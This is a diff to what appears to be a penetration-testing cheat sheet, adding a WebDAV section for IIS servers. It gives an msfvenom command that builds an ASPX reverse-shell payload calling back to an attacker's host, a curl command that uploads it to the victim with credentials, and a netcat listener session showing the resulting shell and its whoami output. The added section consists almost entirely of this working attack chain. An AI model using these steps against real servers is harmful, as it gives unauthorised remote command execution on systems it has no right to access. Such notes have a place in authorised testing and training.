@@ -232,6 +232,32 @@ username=admin&password=FUZZ&submit=Log+In
 ````
 https://cybersecnerds.com/ffuf-everything-you-need-to-know/
 ````
+##### WebDav
+````
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-webdav-scan: 
+|   WebDAV type: Unknown
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
+````
+````
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=80 -f aspx -o shell.aspx
+````
+````
+curl -T 'shell.aspx' 'http://$VictimIP/' -u <username>:<password>
+````
+````
+http://$VictimIP/shell.aspx
+
+nc -nlvp 80  
+listening on [any] 80 ...
+connect to [192.168.45.191] from (UNKNOWN) [192.168.153.122] 49997
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>whoami
+whoami
+iis apppool\defaultapppool
+````
 ##### CMS 
 ###### WP Scan
 ````
